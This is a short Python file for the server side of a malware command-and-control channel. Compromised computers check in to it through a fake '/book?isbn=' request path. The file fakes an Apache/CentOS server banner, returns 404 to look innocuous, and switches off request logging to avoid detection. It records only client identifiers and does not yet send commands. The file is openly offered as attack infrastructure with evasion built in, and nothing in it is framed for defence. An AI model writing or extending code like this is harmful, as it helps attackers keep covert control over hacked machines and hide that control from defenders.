# Command and Control server code

from http import server
from http.server import BaseHTTPRequestHandler, HTTPServer

# Port c2 server listens on
PORT = 80

# Leave blank for binding to all interfaces, otherwise specify c2 server's IP address
BIND_ADDR = ""

# Path to use for signifying a command request form a client using HTTP GET
CMD_REQUEST = "/book?isbn="

class C2Handler(BaseHTTPRequestHandler):
    """This is a child class of the BaseHTTPRequestHandler class.
    It handles all HTTP requests that arrive at the c2 server."""

    # Make our c2 server look like an up-ti-date Apache server on CentOS
    server_version = "Apache/2.4.58"
    sys_version = "(CentOS)"

    # noinspection PyPep8Naming
    def do_GET(self):
        """ This method handles all HTTP GET requests that
        arrive at the c2 server."""

        #Follow this code block when the compromised computer is requesting a command
        if self.path.startswith(CMD_REQUEST):
            client = self.path.split(CMD_REQUEST)[1]
            print(client)

        # Sends the HTTP response code and header back to the client
        self.send_response(404)
        self.end_headers()

    def log_request(self, code: int | str = "-", size: int | str = "-") -> None:
        """ Included this to override BaseHTTPRequestHandler's log_request method because it writes
        to the screen. Our dosen't log any successfuf connections; it just returns, which is whar we want. """
        return
        # return super().log_request(code, size)()

# Instantiate our HTTPServer object
# noinspection PyTypeChecker
server = HTTPServer((BIND_ADDR, PORT), C2Handler)

# Run the server in an infinite loop
server.serve_forever()


# def run(server_class=HTTPServer, handler_class=BaseHTTPRequestHandler):
# server_address = ('', 8000)
# httpd = server_class(server_address, handler_class)
# httpd.serve_forever()
